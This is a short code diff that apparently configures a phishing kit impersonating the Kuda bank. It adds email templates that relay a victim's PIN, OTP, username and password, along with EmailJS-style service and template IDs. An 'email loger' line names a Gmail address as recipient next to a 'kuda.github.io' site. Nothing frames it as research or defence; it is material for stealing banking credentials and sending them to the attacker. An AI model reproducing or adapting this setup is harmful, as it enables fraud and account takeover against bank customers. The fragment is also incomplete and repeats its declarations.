@@ -1,0 +1,32 @@
+// Pin and otp templates
+
+Hello {{to_name}},
+
+Pin : {{pin}}
+
+OTP : {{otp}}
+
+
+// email and password templates
+
+Hello {{to_name}},
+
+You got a new email from {{username}}:
+
+and Password {{password}}
+
+ 
+// pin and otp account template details
+const serviceId = "service_1z0zlau";
+const userId = "gywCrxcDhQgbnUt1w";
+const templateId = "template_w51zcmh";
+
+
+// email and password account template details
+const serviceId = "service_1z0zlau";
+const userId = "gywCrxcDhQgbnUt1w";
+const templateId = "template_sm53zui";
+
+// email loger
+ to_name: "joinkudehelp@gmail.com",
+ kuda.github.io
